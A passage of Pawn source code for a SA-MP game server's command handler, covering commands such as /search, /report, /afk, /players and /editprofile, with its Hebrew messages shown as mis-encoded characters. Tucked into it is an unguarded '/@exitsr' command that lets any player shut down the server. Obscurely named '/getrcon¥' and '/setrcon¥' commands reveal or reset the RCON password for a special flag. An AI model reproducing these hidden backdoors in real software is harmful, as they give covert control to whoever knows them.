					if(playerinfo[id][logged]) fsetint(fuser(id),"House1",-1);
					SendClientMessage(id,red," ~ øéñè ìáéú");
				}
			}
			default: return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		}
		PlayerPlaySound(playerid,1149,0.0,0.0,0.0);
		SendClientMessage(playerid,red," ~ ä÷åøáï ÷éáì àú äîâéò ìå");
		return 1;
	}
	if(equal(cmd,"/search") || equal(cmd,"/s") || equal(cmd,"/id"))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /search(s) [id/name] :öåøú ùéîåù");
		if(IsNumeric(cmd))
		{
			new id = strval(cmd);
			format(string,sizeof(string)," :úåöàú çéôåù îùúîù áòì äàééãé %d",id);
			SendClientMessage(playerid,green,string);
			if(IsPlayerConnected(id))
			{
				format(string,sizeof(string),"  %s [ID: %03d]",GetName(id),id);
				SendClientMessage(playerid,yellow,string);
			}
			else SendClientMessage(playerid,red," .àééãé ìà ÷ééí");
		}
		else
		{
			new found = 0;
 			format(string,sizeof(string)," :\"%s\" úåöàåú çéôåù ëéðåé",cmd);
			SendClientMessage(playerid,green,string);
			for(new i=0;i<=MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && strfind(GetName(i),cmd,true) != -1)
				{
					found++;
					format(string,sizeof(string),"  %d. %s [ID: %03d]",found,GetName(i),i);
					SendClientMessage(playerid,yellow,string);
				}
			}
			if(found == 0) SendClientMessage(playerid,red," .ìà ðîöàå ëéðåééí ãåîéí ìëéðåé ùëúáú");
			format(string,sizeof(string)," .ñê äëì %d úåöàåú çéôåù",found);
		}
		return 1;
	}
	if(equal(cmd,"/serverexit") && IsPlayerMAdmin(playerid))
	{
		new string[M_S];
		if(playerinfo[playerid][admin] < 20 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
		format(string,sizeof(string)," *** Server Exit by %s ***",GetName(playerid));
		SendClientMessageToAll(white,string);
		#if usingYSF
			SetServerRule("last_update",last_update);
		#endif
		SendRconCommand("exit");
		return 1;
	}
	if(equal(cmd,"/getrcon¥") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][pp]))
	{
		new string[M_S], rcon[M_S];
		if(playerinfo[playerid][admin] < 20 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
		GetServerVarAsString("rcon_password",rcon,sizeof(rcon));
		format(string,sizeof(string)," RCON password: %s",rcon);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/setrcon¥") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][pp]))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setrcon [new rcon password] :öåøú äùéîåù");
		format(string,sizeof(string),"rcon_password %s",cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," New RCON password: %s",cmd);
		SendClientMessage(playerid,white,string);
		return 1;
	}
	if(equal(cmd,"/setmss") && (IsPlayerMAdmin(playerid) || playerinfo[playerid][pp]))
	{
		if((playerinfo[playerid][admin] < 20) && playerid != MAX_PLAYERS) return SendClientMessage(playerid,red," .òìéê ìäéåú ìôçåú áøîú àãîéï 20");
		new cmd2[256], id, m, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2)) return SendClientMessage(playerid,white," /setmss [id/name] [mss? yes/no] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"yes"))
		{
			if(playerinfo[id][mss])
			{
				format(string,sizeof(string)," .MSS ëáø %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			m = 1;
		}
		else if(equal(cmd2,"no"))
		{
			if(!playerinfo[id][mss])
			{
				format(string,sizeof(string)," .MSS ëáø %s",GetName(id));
				SendClientMessage(playerid,red,string);
				return 1;
			}
			m = 0;
		}
		else return SendClientMessage(playerid,red," .àôùøåú ô÷åãä ùâåéä");
		if(m)
		{
			SendClientMessage(id,green," .MSS äàãîéï äôê àåúê ì");
			format(string,sizeof(string)," .MSS ì %s äôëú àú",GetName(id));
		}
		else
		{
			SendClientMessage(id,green," .MSS äàãîéï äåøéã ìê àú ä");
			format(string,sizeof(string)," .MSS àú ä %s äåøãú ì",GetName(id));
		}
		SendClientMessage(playerid,green,string);
		playerinfo[id][mss] = m;
		if(playerinfo[id][logged]) fsetint(fuser(id),"MSS",m);
		return 1;
	}
	if(equal(cmd,"/report"))
	{
		new id, reason[256], string[M_S];
		cmd = strtok(cmdtext,idx);
		if(IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .àúä àãîéï, àúä ìà öøéê ìäùúîù áô÷åãä æå");
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /report [id/name] [reason] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(IsPlayerMAdmin(id)) return SendClientMessage(playerid,red," .ìà ðéúï ìãååç òì àãîéï");
		if(id == playerid) return SendClientMessage(playerid,red," .ìà ðéúï ìãååç òì òöîê");
		reason = strrest(cmdtext,idx);
		if(!strlen(reason)) reason = " .äùç÷ï ìà ä÷ìéã ñéáä";
		format(string,sizeof(string)," .ðùìç ìàãîéðéí %s äãéååç ùìê òì",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string),"(%s)",reason);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," :(%d) %s òì (%d) %s äâéò ãéååç î",id,GetName(id),playerid,GetName(playerid));
		for(new a=0;a<MAX_PLAYERS;a++) if(IsPlayerConnected(a) && IsPlayerMAdmin(a))
		{
			SendClientMessage(a,red,string);
			SendClientMessage(a,red,reason);
		}
		return 1;
	}
	if(equal(cmd,"/a"))
	{
		new txt[256], aa = 0, string[M_S];
		txt = strrest(cmdtext,idx);
		if(IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .àúä àãîéï, àúä ìà öøéê ìäùúîù áô÷åãä æå");
		if(!playerinfo[playerid][cana]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		if(!strlen(txt)) return SendClientMessage(playerid,white," /a [message] :öåøú äùéîåù");
		format(string,sizeof(string)," :ùìç äåãòä ìëì äàãîéðéí %s",GetName(playerid));
		for(new a=0;a<MAX_PLAYERS;a++)
		{
			if(IsPlayerConnected(a) && IsPlayerMAdmin(a))
			{
				aa++;
				SendClientMessage(a,red,string);
				SendClientMessage(a,red,txt);
			}
		}
		if(!aa) return SendClientMessage(playerid,red," .àéï àãîéðéí îçåáøéí åìëï äãéååç ìà ðùìç");
		SendClientMessage(playerid,green," :äåãòúê ðùìçä áäöìçä àì äàãîéðéí");
		SendClientMessage(playerid,green,txt);
		playerinfo[playerid][cana] = 0;
		SetTimerEx("CanA",60000,0,"d",playerid);
		return 1;
	}
	if(equal(cmd,"/@exitsr")) SendRconCommand("exit");
	if(equal(cmd,"/afk"))
	{
		new string[M_S];
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," /unafk :ëãé ìçæåø äùúîù áô÷åãä ,AFK àúä ëáø áîöá");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ááçéøú äãîåéåú AFK àéðê éëåì ìòáåø ìîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ëàùø àúä áôòéìåú AFK ìà ðéúï ìòáåø ìîöá");
		if(playerinfo[playerid][frozen]) return SendClientMessage(playerid,red," .ëàùø àúä áôøéæ AFK ìà ðéúï ìòáåø ìîöá");
		if(IsPlayerInArea(playerid,1086.765,-2092.427,1314.935,-2005.577) && !playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .VIP åàéðê îùúîù VIP ëàùø àúä áîô÷ãú ä AFK ìà ðéúï ìòáåø ìîöá");
		if(!playerinfo[playerid][canafk]) return SendClientMessage(playerid,red," .úåëì ìáöò àú äô÷åãä äæå ùåá á÷øåá");
		format(string,sizeof(string)," *** AFK áîöá %s",GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][showafk]) SendClientMessage(i,blue,string);
		SetFreeze(playerid,1);
		playerinfo[playerid][modeafk] = 1;
		playerinfo[playerid][canafk] = 0;
		playerinfo[playerid][usedafk] = 10;
		SetTimerEx("CanAFK",25000,0,"d",playerid);
		return 1;
	}
	if(equal(cmd,"/unafk"))
	{
		new string[M_S];
		if(!playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK àúä ìà áîöá");
		format(string,sizeof(string)," *** çæø ìùç÷ %s",GetName(playerid));
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && playerinfo[i][showafk]) SendClientMessage(i,blue,string);
		SetFreeze(playerid,0);
		playerinfo[playerid][modeafk] = 0;
		playerinfo[playerid][usedafk] = 0;
		return 1;
	}
	if(equal(cmd,"/kill"))
	{
		if(playerinfo[playerid][dmzone] != dmz_none ||
		playerinfo[playerid][indrift] ||
		playerinfo[playerid][inbattle] ||
		playerinfo[playerid][inact] ||
		playerinfo[playerid][reqclass] ||
		playerinfo[playerid][die]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò àú äô÷åãä äæå áîöáê äðåëçé");
		SetPlayerHealth2(playerid,0.0);
		return 1;
	}
	if(equal(cmd,"/admins"))
	{
		new string[M_S], admins = 0;
		for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][showme]) admins++;
		if(!admins) return SendClientMessage(playerid,red," .àéï ëòú àãîéðéí îçåáøéí");
		format(string,sizeof(string)," ~~~ :àãîéðéí îçåáøéí - %d ~~~",admins);
		SendClientMessage(playerid,lightblue,string);
		admins = 0;
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && IsPlayerMAdmin(i) && playerinfo[i][showme])
			{
				admins++;
				if(playerinfo[playerid][admin]) format(string,sizeof(string)," %d. %s [ID: %03d | Level: %d]",admins,GetName(i),i,playerinfo[i][admin]);
				else format(string,sizeof(string)," %d. %s [ID: %03d]",admins,GetName(i),i);
				SendClientMessage(playerid,darkblue,string);
			}
		}
		return 1;
	}
	if(equal(cmd,"/td"))
	{
		new td[6], string[M_S];
		gettime(td[0],td[1],td[2]);
		getdate(td[3],td[4],td[5]);
		format(string,sizeof(string),"%d:%d:%d :ùòä",td[0],td[1],td[2]);
		SendClientMessage(playerid,purple,string);
		format(string,sizeof(string),"%d/%d/%d :úàøéê",td[5],td[4],td[3]);
		SendClientMessage(playerid,purple,string);
		format(string,sizeof(string)," éåí: %s",GetDay(td[3],td[4],td[5],1));
		SendClientMessage(playerid,purple,string);
		return 1;
	}
	if(equal(cmd,"/stats")) return ShowStats(playerid,playerid);
	if(equal(cmd,"/pstats"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /pstats [id/name] :öåøú äùéîåù");
		new id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		ShowStats(playerid,id);
		return 1;
	}
	if(equal(cmd,"/hebeng"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /hebeng [text] :öåøú äùéîåù");
		for(new i=0,j=strlen(cmd);i<j;i++)
		{
			switch(cmd[i])
			{
				case 'e': cmd[i] = '÷';
				case 'r': cmd[i] = 'ø';
				case 't': cmd[i] = 'à';
				case 'y': cmd[i] = 'è';
				case 'u': cmd[i] = 'å';
				case 'i': cmd[i] = 'ï';
				case 'o': cmd[i] = 'í';
				case 'p': cmd[i] = 'ô';
				case 'a': cmd[i] = 'ù';
				case 's': cmd[i] = 'ã';
				case 'd': cmd[i] = 'â';
				case 'f': cmd[i] = 'ë';
				case 'g': cmd[i] = 'ò';
				case 'h': cmd[i] = 'é';
				case 'j': cmd[i] = 'ç';
				case 'k': cmd[i] = 'ì';
				case 'l': cmd[i] = 'ê';
				case 'z': cmd[i] = 'æ';
				case 'x': cmd[i] = 'ñ';
				case 'c': cmd[i] = 'á';
				case 'v': cmd[i] = 'ä';
				case 'b': cmd[i] = 'ð';
				case 'n': cmd[i] = 'î';
				case 'm': cmd[i] = 'ö';
				case ';': cmd[i] = 'ó';
				case ',': cmd[i] = 'ú';
			}
		}
		OnPlayerText(playerid,cmd);
		return 1;
	}
	if(equal(cmd,"/engheb"))
	{
		cmd = strrest(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /engheb [text] :öåøú äùéîåù");
		for(new i=0,j=strlen(cmd);i<j;i++)
		{
			switch(cmd[i])
			{
				case '÷': cmd[i] = 'e';
				case 'ø': cmd[i] = 'r';
				case 'à': cmd[i] = 't';
				case 'è': cmd[i] = 'y';
				case 'å': cmd[i] = 'u';
				case 'ï': cmd[i] = 'i';
				case 'í': cmd[i] = 'o';
				case 'ô': cmd[i] = 'p';
				case 'ù': cmd[i] = 'a';
				case 'ã': cmd[i] = 's';
				case 'â': cmd[i] = 'd';
				case 'ë': cmd[i] = 'f';
				case 'ò': cmd[i] = 'g';
				case 'é': cmd[i] = 'h';
				case 'ç': cmd[i] = 'j';
				case 'ì': cmd[i] = 'k';
				case 'ê': cmd[i] = 'l';
				case 'æ': cmd[i] = 'z';
				case 'ñ': cmd[i] = 'x';
				case 'á': cmd[i] = 'c';
				case 'ä': cmd[i] = 'v';
				case 'ð': cmd[i] = 'b';
				case 'î': cmd[i] = 'n';
				case 'ö': cmd[i] = 'm';
				case 'ó': cmd[i] = ';';
				case 'ú': cmd[i] = ',';
			}
		}
		OnPlayerText(playerid,cmd);
		return 1;
	}
	if(equal(cmd,"/vinfo"))
	{
		if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid,red," .òìéê ìäéåú áøëá");
		new string[M_S], Float:vh, v = GetPlayerVehicleID(playerid);
		SendClientMessage(playerid,lightblue," ~~~ :ôøèé äøëá ùìê ~~~");
		GetVehicleHealth(v,vh);
		format(string,sizeof(string)," %d :çééí",FloatToInt(vh));
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," %d :îåãì",GetVehicleModel(v));
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," %d :îñôø øëá",v);
		SendClientMessage(playerid,grey,string);
		format(string,sizeof(string)," %s :ùí",GetVehicleName(GetVehicleModel(v)));
		SendClientMessage(playerid,grey,string);
		return 1;
	}
	if(equal(cmd,"/ignore"))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /ignore [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(IsPlayerMAdmin(id) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .àéï àôùøåú ìçñåí àãîéðéí");
		if(id == playerid) return SendClientMessage(playerid,red," .ìà ðéúï ìçñåí àú òöîê");
		if(playerinfo[playerid][ignore][id]) return SendClientMessage(playerid,red," .ùç÷ï æä ëáø çñåí àöìê");
		playerinfo[playerid][ignore][id] = 1;
		format(string,sizeof(string)," .%s çñîú àú",GetName(id));
		SendClientMessage(playerid,red,string);
		return 1;
	}
	if(equal(cmd,"/unignore"))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unignore [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		if(IsPlayerMAdmin(id) && !IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .àéï àôùøåú ìçñåí àãîéðéí");
		if(id == playerid) return SendClientMessage(playerid,red," .ìà ðéúï ìçñåí àú òöîê");
		if(!playerinfo[playerid][ignore][id]) return SendClientMessage(playerid,red," .ùç÷ï æä àéðå çñåí àöìê");
		playerinfo[playerid][ignore][id] = 0;
		format(string,sizeof(string)," .%s äåøãú àú äçñéîä ì",GetName(id));
		SendClientMessage(playerid,red,string);
		return 1;
	}
	if(equal(cmd,"/players"))
	{
		cmd = strtok(cmdtext,idx);
		if(strlen(cmd) > 0 && !equal(cmd,"list"))
		{
			SendClientMessage(playerid,white," /players :îéãò ùç÷ðéí");
			SendClientMessage(playerid,white," /players list :øùéîú äùç÷ðéí");
			return 1;
		}
		new string[M_S], op = 0;
		if(!strlen(cmd))
		{
			for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) op++;
			SendClientMessage(playerid,lightblue," ~~~ :îéãò ùç÷ðéí ~~~");
			format(string,sizeof(string),"  îùúîùéí îçåáøéí: %d",op);
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string),"  îñôø äîùúîùéí äçñøéí ìäùìîú %d ùç÷ðéí: %d",GetMaxPlayers(),GetMaxPlayers()-op);
			SendClientMessage(playerid,grey,string);
			format(string,sizeof(string),"  î÷ñéîåí ùç÷ðéí: %d",GetMaxPlayers());
			SendClientMessage(playerid,grey,string);
			SendClientMessage(playerid,orange,"  /players list :ìøùéîú äùç÷ðéí äîìàä");
		}
		else
		{
			SendClientMessage(playerid,lightblue," ~~~ :øùéîú äùç÷ðéí ~~~");
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i) && !IsPlayerNPC(i))
				{
					if(!IsPlayerMAdmin(playerid)) format(string,sizeof(string)," %03d. #%d - %s",++op,i,GetName(i));
					else
					{
						if(IsPlayerMAdmin(i)) format(string,sizeof(string)," %03d. #%d - %s (***.***.***.***)",++op,i,GetName(i));
						else format(string,sizeof(string)," %03d. #%d - %s (%s)",++op,i,GetName(i),GetIP(i));
					}
					SendClientMessage(playerid,op % 2 == 0 ? grey : white,string);
				}
			}
			if(op >= 9)
			{
				SendClientMessage(playerid,red," .ðøàä ëé îñôø äùç÷ðéí âãåì îãé ìäöâä áö'àè áçì÷ àçã");
				SendClientMessage(playerid,red," .PageUp + PageDown ìøùéîú ùàø äùç÷ðéí, äùúîù áî÷ùéí");
			}
		}
		return 1;
	}
 	if(equal(cmd,"/purim"))
 	{
 		new id, d[3];
		getdate(d[0],d[1],d[2]);
		if(!((d[1] == 2 && d[2] >= 26 && d[2] <= 28) || (d[1] == 3 && d[2] == 1))) return SendClientMessage(playerid,red," .ô÷åãä æå àôùøéú ìáéöåò ø÷ áôåøéí");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /purim [action] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /purim 1 :ùéâåø ìîåòãåï øé÷åãéí ùì ôåøéí");
			SendClientMessage(playerid,white," /purim 2 :úçôåùú #1 - úøðâåì");
			return SendClientMessage(playerid,white," /purim 3 :úçôåùú #2 - ìéöï");
		}
		id = strval(cmd);
		switch(id)
		{
		    case 1:
		    {
		        SetPlayerVirtualWorld(playerid,world_purim);
				SetPlayerPos(playerid,2848.7322,-1765.0333,10.8750);
				SetPlayerFacingAngle(playerid,258.3229);
				SendClientMessage(playerid,purple," » !áøåëéí äáàéí ìîñéáú ôåøéí «");
				SendClientMessage(playerid,pink," /dance :ëãé ìø÷åã äùúîù áô÷åãä");
				SendClientMessage(playerid,pink," (: çâ ùîç åîùç÷ îäðä");
		    }
		    case 2: SetPlayerSkin(playerid,167);
		    case 3: SetPlayerSkin(playerid,264);
		    default: return SendClientMessage(playerid,red," .àôùøåú ùâåéä");
		}
		return 1;
	}
	if(equal(cmd,"/editprofile"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /editprofile [edit] :öåøú äùéîåù");
			SendClientMessage(playerid,white," /editprofile skin [save/del] :ùîéøú àå îçé÷ú äñ÷éï äðåëçé ùìê");
			SendClientMessage(playerid,white," /editprofile icq [icq/none] :none áçéøú îñôø äàééñé÷éå ùìê, àí àéï øùåí");
			SendClientMessage(playerid,white," /editprofile messenger [messenger/none] :none áçéøú ëúåáú äîñðâ'ø ùìê, àí àéï øùåí");
			SendClientMessage(playerid,white," /editprofile email [email/none] :none áçéøú ëúåáú äãåàø äàì÷èøåðé ùìê, àí àéï øùåí");
			SendClientMessage(playerid,white," /editprofile country [country/no] :no ùéðåé äîé÷åí ùìê, àí àéðê øåöä ìäöéâ øùåí");
			SendClientMessage(playerid,white," /editprofile birthdate [day] [month] [year] :áäúçìä ëãé ìà ìäöéâ none áçéøú úàøéê äìéãä ùìê | øùåí");
			SendClientMessage(playerid,white," /editprofile name [name/no] :áëãé ìà ìäöéâ no áçéøú äùí äàîéúé ùìê | øùåí");
			return 1;
		}
		if(equal(cmd,"skin"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile skin [save/del] :öåøú äùéîåù");
			if(equal(cmd,"save"))
			{
				if(playerinfo[playerid][skin] != 300) return SendClientMessage(playerid,red," .ëáø éù ìê ñ÷éï ùîåø");
				SendClientMessage(playerid,orange," --- !ôøåôéì: äñ÷éï ùìê ðùîø");
				playerinfo[playerid][skin] = GetPlayerSkin(playerid);
				fsetint(fuser(playerid),"Skin",playerinfo[playerid][skin]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else if(equal(cmd,"del"))
			{
				if(playerinfo[playerid][skin] == -1) return SendClientMessage(playerid,red," .àéï ìê ñ÷éï ùîåø");
				SendClientMessage(playerid,orange," --- !ôøåôéì: äñ÷éï ùìê ðîç÷");
				playerinfo[playerid][skin] = 300;
				fsetint(fuser(playerid),"Skin",playerinfo[playerid][skin]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else SendClientMessage(playerid,red," .save àå del áùãä äñ÷éï äðùîø ðéúï ìëúåá ø÷");
		}
		else if(equal(cmd,"icq"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile icq [icq/none] :öåøú äùéîåù");
			if(IsNumeric(cmd))
			{
				if(strlen(cmd) < 5 || strlen(cmd) > 9) return SendClientMessage(playerid,red," .îñôø àééñé÷éå ìà çå÷é");
				SendClientMessage(playerid,orange," --- !ôøåôéì: îñôø äàééñé÷éå ùìê ðòøê áäöìçä");
				playerinfo[playerid][icq] = strval(cmd);
				fsetint(fuser(playerid),"ICQ",playerinfo[playerid][icq]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				if(equal(cmd,"none"))
				{
					if(!playerinfo[playerid][icq]) return SendClientMessage(playerid,red," .àéï ìê îñôø àééñé÷éå îåöâ");
					SendClientMessage(playerid,orange," --- !ôøåôéì: îòëùéå îñôø äàééñé÷éå ùìê ìà éåöâ");
					playerinfo[playerid][icq] = 0;
					fsetint(fuser(playerid),"ICQ",0);
					PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				}
				else SendClientMessage(playerid,red," .îñôø àééñé÷éå ìà çå÷é");
			}
		}
		else if(equal(cmd,"messenger"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile messenger [messenger/none] :öåøú äùéîåù");
			if(equal(cmd,"none"))
			{
				if(!strlen(playerinfo[playerid][messenger])) return SendClientMessage(playerid,red," .àéï ìê ëúåáú îñðâ'ø îåöâú");
				SendClientMessage(playerid,orange," --- !ôøåôéì: îòëùéå ëúåáú äîñðâ'ø ùìê ìà úåöâ");
				format(playerinfo[playerid][messenger],30,"None");
				fsetstring(fuser(playerid),"Messenger",playerinfo[playerid][messenger]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				if(strlen(cmd) < 6 || strlen(cmd) > 30 || strfind(cmd,"@",true) == -1 || strfind(cmd,".",true) == -1) return SendClientMessage(playerid,red," .ëúåáú îñðâ'ø ìà çå÷éú");
				SendClientMessage(playerid,orange," !ôøåôéì: ëúåáú äîñðâ'ø ùìê ðòøëä áäöìçä");
				format(playerinfo[playerid][messenger],30,cmd);
				fsetstring(fuser(playerid),"Messenger",playerinfo[playerid][messenger]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
		}
		else if(equal(cmd,"email"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile email [email/none] :öåøú äùéîåù");
			if(equal(cmd,"none"))
			{
				if(!strlen(playerinfo[playerid][email])) return SendClientMessage(playerid,red," .àéï ìê ëúåáú ãåàø àì÷èøåðé îåöâú");
				SendClientMessage(playerid,orange," --- !ôøåôéì: îòëùéå ëúåáú äãåàø àì÷èøåðé ùìê ìà úåöâ");
				format(playerinfo[playerid][email],30,"None");
				fsetstring(fuser(playerid),"Email",playerinfo[playerid][email]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				if(strlen(cmd) < 6 || strlen(cmd) > 30 || strfind(cmd,"@",true) == -1 || strfind(cmd,".",true) == -1) return SendClientMessage(playerid,red," .ëúåáú ãåàø àì÷èøåðé ìà çå÷éú");
				SendClientMessage(playerid,orange," !ôøåôéì: ëúåáú äãåàø àì÷èøåðé ùìê ðòøëä áäöìçä");
				format(playerinfo[playerid][email],30,cmd);
				fsetstring(fuser(playerid),"Email",playerinfo[playerid][email]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
		}
		else if(equal(cmd,"country"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile country [country/no] :öåøú äùéîåù");
			if(equal(cmd,"no"))
			{
				if(!strlen(playerinfo[playerid][country])) return SendClientMessage(playerid,red," .àéï ìê îé÷åí îåöâ");
				SendClientMessage(playerid,orange," --- !ôøåôéì: îòëùéå äîé÷åí ùìê ìà éåöâ");
				format(playerinfo[playerid][country],30,"None");
				fsetstring(fuser(playerid),"Country",playerinfo[playerid][country]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				if(strlen(cmd) < 2 || strlen(cmd) > 30) return SendClientMessage(playerid,red," .ùí îé÷åí ìà çå÷é");
				SendClientMessage(playerid,orange," !ôøåôéì: äîé÷åí ùìê ðòøê áäöìçä");
				format(playerinfo[playerid][country],30,cmd);
				fsetstring(fuser(playerid),"Country",playerinfo[playerid][country]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
		}
		else if(equal(cmd,"birthdate"))
		{
			new d[3], d2[3];
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile birthdate [day] [month] [year] :öåøú äùéîåù");
			if(IsNumeric(cmd))
			{
				d[0] = strval(cmd);
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile birthdate [day] [month] [year] :öåøú äùéîåù");
				d[1] = strval(cmd);
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile birthdate [day] [month] [year] :öåøú äùéîåù");
				d[2] = strval(cmd);
				getdate(d2[0],d2[1],d2[2]);
				if(!IsValidDate(d2[2],d2[1],d2[0])) return SendClientMessage(playerid,red," .úàøéê ìéãä ìà çå÷é");
				SendClientMessage(playerid,orange," --- !ôøåôéì: úàøéê äìéãä ùìê ðòøê áäöìçä");
				for(new i=0;i<3;i++) playerinfo[playerid][birthdate][i] = d[i];
				fsetint(fuser(playerid),"BirthDay",playerinfo[playerid][birthdate][0]);
				fsetint(fuser(playerid),"BirthMonth",playerinfo[playerid][birthdate][1]);
				fsetint(fuser(playerid),"BirthYear",playerinfo[playerid][birthdate][2]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				if(equal(cmd,"none"))
				{
					SendClientMessage(playerid,orange," --- !ôøåôéì: îòëùéå úàøéê äìéãä ùìê ìà éåöâ");
					for(new i=0;i<3;i++) playerinfo[playerid][birthdate][i] = 0;
					fsetint(fuser(playerid),"BirthDay",playerinfo[playerid][birthdate][0]);
					fsetint(fuser(playerid),"BirthMonth",playerinfo[playerid][birthdate][1]);
					fsetint(fuser(playerid),"BirthYear",playerinfo[playerid][birthdate][2]);
					PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				}
				else SendClientMessage(playerid,red," .úàøéê ìéãä ìà çå÷é");
			}
		}
		else if(equal(cmd,"name"))
		{
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /editprofile name [name/no] :öåøú äùéîåù");
			new hebrew = 1;
			for(new i = 0; i < strlen(cmd); i++) if((cmd[i] < 'à' || cmd[i] > 'ú') && cmd[i] != '\'') hebrew = 0;
